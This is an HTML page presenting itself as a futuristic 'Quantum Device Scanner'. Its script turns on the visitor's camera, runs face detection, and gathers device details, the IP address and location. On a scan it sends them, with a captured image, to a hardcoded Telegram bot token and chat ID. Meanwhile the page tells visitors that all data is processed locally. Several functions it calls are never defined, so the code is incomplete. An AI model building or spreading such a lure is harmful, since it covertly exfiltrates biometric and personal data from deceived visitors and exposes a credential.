<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Quantum Device Scanner v4.0</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@2.0.0/dist/tf.min.js"></script>
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
      --hologram: rgba(46, 204, 113, 0.2);
      --danger: #e74c3c;
      --warning: #f39c12;
    }
    
    body { 
      font-family: 'Courier New', monospace;
      text-align: center; 
      padding: 20px; 
      background: #0a0a0a;
      color: var(--primary);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-image: 
        radial-gradient(var(--hologram) 1px, transparent 1px),
        radial-gradient(var(--hologram) 1px, transparent 1px);
      background-size: 50px 50px;
      background-position: 0 0, 25px 25px;
    }
    
    .hologram-effect {
      position: fixed;
      width: 200%;
      height: 200%;
      background: 
        linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%),
        linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%),
        linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%),
        linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
      background-size: 20px 20px;
      pointer-events: none;
      mix-blend-mode: overlay;
      opacity: 0.3;
      z-index: 9999;
      animation: hologram 20s linear infinite;
    }
    
    @keyframes hologram {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
    
    .scanner-box {
      position: relative;
      width: 300px;
      height: 300px;
      margin: 0 auto;
      overflow: hidden;
      border: 2px solid var(--primary);
      border-radius: 8px;
      box-shadow: 0 0 20px var(--hologram);
    }
    
    .scanner-box video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    
    .scanner-line {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(to right, transparent, var(--primary), transparent);
      animation: scanLine 3s linear infinite;
      z-index: 2;
      box-shadow: 0 0 10px var(--primary);
    }
    
    @keyframes scanLine {
      0% { top: 0; }
      100% { top: 100%; }
    }
    
    button {
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      padding: 12px 24px;
      margin: 15px 0;
      border-radius: 30px;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4);
    }
    
    button:disabled {
      background: #555;
      cursor: not-allowed;
    }
    
    #loading {
      display: none;
      margin: 20px 0;
      font-size: 18px;
      position: relative;
    }
    
    #loading:after {
      content: "...";
      position: absolute;
      animation: dots 1.5s steps(5, end) infinite;
    }
    
    @keyframes dots {
      0%, 20% { content: "."; }
      40% { content: ".."; }
      60%, 100% { content: "..."; }
    }
    
    #device-info {
      background: rgba(10, 10, 10, 0.8);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 15px;
      margin-top: 20px;
      max-width: 90%;
      width: 100%;
      box-shadow: 0 0 15px var(--hologram);
    }
    
    .info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 10px;
      text-align: left;
    }
    
    .info-item {
      margin: 5px 0;
    }
    
    .info-label {
      font-weight: bold;
      color: var(--secondary);
    }
    
    .face-results {
      margin-top: 20px;
      width: 100%;
      max-width: 500px;
      text-align: left;
    }
    
    .face-card {
      background: rgba(20, 20, 20, 0.8);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 15px;
      position: relative;
    }
    
    .face-box {
      position: absolute;
      border: 2px solid #2ecc71;
      box-shadow: 0 0 10px #2ecc71;
      background: transparent;
      pointer-events: none;
    }
    
    .signal-strength {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    
    .signal-bar {
      width: 4px;
      height: 12px;
      background: #555;
      transition: all 0.3s ease;
    }
    
    .particles {
      position: fixed;
      pointer-events: none;
      z-index: 10000;
    }
    
    .tabs {
      display: flex;
      margin-bottom: 15px;
      border-bottom: 1px solid var(--hologram);
    }
    
    .tab {
      padding: 10px 20px;
      cursor: pointer;
      border-bottom: 2px solid transparent;
      transition: all 0.3s;
    }
    
    .tab.active {
      border-bottom: 2px solid var(--primary);
      color: var(--primary);
    }
    
    .tab-content {
      display: none;
    }
    
    .tab-content.active {
      display: block;
    }
    
    @keyframes particle {
      0% { transform: translateY(0); opacity: 1; }
      100% { transform: translateY(-100px); opacity: 0; }
    }
  </style>
</head>
<body>
  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">üõ∏ QUANTUM DEVICE SCANNER v4.0</h1>
  
  <div class="tabs">
    <div class="tab active" data-tab="scanner">Scanner</div>
    <div class="tab" data-tab="results">Results</div>
    <div class="tab" data-tab="profiles">Profiles</div>
  </div>
  
  <div class="tab-content active" id="scanner-tab">
    <div class="scanner-box">
      <div class="scanner-line"></div>
      <video id="video" autoplay playsinline muted></video>
    </div>
    <button id="capture-btn" class="pulse">üöÄ INITIATE DEEP SCAN</button>
    <div id="loading" style="display:none;">üî≠ CAPTURING QUANTUM SIGNATURE<span></span></div>
    <div class="alert alert-warning">
      ‚ö†Ô∏è This scanner uses advanced AI to analyze device signatures and facial biometrics. All data is processed locally.
    </div>
  </div>
  
  <div class="tab-content" id="results-tab">
    <div id="device-info">
      <h2>‚ö° DEVICE MATRIX PROFILE</h2>
      <div class="info-grid" id="device-info-content"></div>
    </div>
  </div>
  
  <div class="tab-content" id="profiles-tab">
    <h2>üë§ FACIAL RECOGNITION RESULTS</h2>
    <div id="face-results" class="face-results">
      <p>No facial recognition data available. Perform a scan first.</p>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');
    let faceDescriptors = [];
    let socialProfiles = [];
    
    // Initialize tabs
    document.querySelectorAll('.tab').forEach(tab => {
      tab.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
      });
    });

    // Face detection functions
    async function detectFaces() {
      try {
        return await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
          .withFaceLandmarks()
          .withFaceDescriptors();
      } catch (error) {
        console.error("Face detection error:", error);
        return [];
      }
    }

    async function loadFaceModel() {
      try {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
        await faceapi.nets.faceLandmark68Net.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
        await faceapi.nets.faceRecognitionNet.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
        console.log("Face detection models loaded");
      } catch (error) {
        console.error("Error loading face models:", error);
      }
    }

    // Enhanced device info gathering
    async function gatherDeviceInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const battery = navigator.getBattery ? await navigator.getBattery() : null;
      
      return {
        os: getOS(),
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
        deviceModel: getDeviceModel(),
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'N/A',
        battery: {
          level: battery ? `${Math.round(battery.level * 100)}%` : 'N/A',
          charging: battery ? (battery.charging ? 'Yes ‚ö°' : 'No üîã') : 'N/A',
          chargingTime: battery ? (battery.chargingTime === Infinity ? 
            'Not charging' : `${battery.chargingTime}s`) : 'N/A'
        },
        network: connection ? `
          ${connection.effectiveType.toUpperCase()} - 
          Downlink: ${connection.downlink}Mb/s - 
          RTT: ${connection.rtt}ms
        ` : 'Unknown',
        ip: await getIPAddress(),
        gpu: getGPUInfo()
      };
    }

    // Helper functions
    function getOS() {
      const ua = navigator.userAgent;
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac")) return "MacOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone")) return "iOS";
      return "Unknown OS";
    }

    function getDeviceModel() {
      const ua = navigator.userAgent;
      if (/iPhone/.test(ua)) return "iPhone";
      if (/iPad/.test(ua)) return "iPad";
      if (/Android/.test(ua)) return "Android Device";
      return "Desktop";
    }

    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (e) {
        return "Unknown";
      }
    }

    function getGPUInfo() {
      const gl = document.createElement('canvas').getContext('webgl');
      return gl ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "Not available";
    }

    // Real-time face detection
    let faceDetectionActive = false;
    
    async function startRealTimeFaceDetection() {
      faceDetectionActive = true;
      const detectionFrame = async () => {
        if (!faceDetectionActive) return;
        
        try {
          const detections = await faceapi.detectAllFaces(
            video, 
            new faceapi.TinyFaceDetectorOptions()
          ).withFaceLandmarks();
          
          document.querySelectorAll('.face-box').forEach(el => el.remove());
          
          detections.forEach(detection => {
            const box = detection.detection.box;
            const faceBox = document.createElement('div');
            faceBox.className = 'face-box';
            Object.assign(faceBox.style, {
              left: `${box.x}px`,
              top: `${box.y}px`,
              width: `${box.width}px`,
              height: `${box.height}px`,
              position: 'absolute'
            });
            document.body.appendChild(faceBox);
          });
        } catch (error) {
          console.error('Face detection error:', error);
        }
        requestAnimationFrame(detectionFrame);
      };
      detectionFrame();
    }

    // Camera initialization
    async function initCamera() {
      try {
        const constraints = {
          video: { 
            facingMode: /Mobi|Android/i.test(navigator.userAgent) ? 'user' : 'environment',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        currentStream = stream;
        await loadFaceModel();
        startRealTimeFaceDetection();
      } catch (err) {
        alert('Error accessing camera: ' + err.message);
      }
    }

    // Main scan function
    async function startQuantumScan() {
      if(isScanning) return;
      isScanning = true;
      loading.style.display = 'block';
      document.getElementById('capture-btn').disabled = true;

      try {
        const [imageData, deviceInfo, faceDetections] = await Promise.all([
          captureQuantumImage(),
          gatherDeviceInfo(),
          detectFaces()
        ]);

        faceDescriptors = faceDetections;
        socialProfiles = await findSimilarSocialProfiles(faceDetections);
        
        displayDeviceInfo(deviceInfo);
        displayFaceResults(faceDetections, socialProfiles);
        sendToTelegram(generateHologramReport(imageData, await getLocation(), deviceInfo));
        
        document.querySelector('.tab[data-tab="results"]').click();
      } catch (error) {
        console.error("Scan error:", error);
        alert("Scan failed: " + error.message);
      } finally {
        loading.style.display = 'none';
        isScanning = false;
        document.getElementById('capture-btn').disabled = false;
      }
    }

    // Initialization
    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
    } else {
      alert('Quantum Scanner requires camera access!');
    }

    window.addEventListener('beforeunload', () => {
      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
    });
  </script>
</body>
</html>
